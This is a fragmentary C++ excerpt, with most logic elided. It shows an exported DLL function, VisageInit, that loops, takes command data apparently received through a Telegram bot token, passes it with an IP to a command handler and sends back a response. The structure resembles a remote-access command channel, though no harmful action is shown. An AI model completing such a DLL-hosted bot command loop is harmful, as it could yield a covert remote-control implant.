...
#define VISAGE_BOT_TOKEN "" //define bot token... PLease include "bot" at the beginning
...
extern "C" void __declspec(dllexport) VisageInit()
{
	...
	while (1)
	{
		...
		if (data.size() > 0) { //data sould be greater than 0
			//data is valid
			//handle command data
			std::string resp = TeleHandleCommand(data,ip);
			//send response 
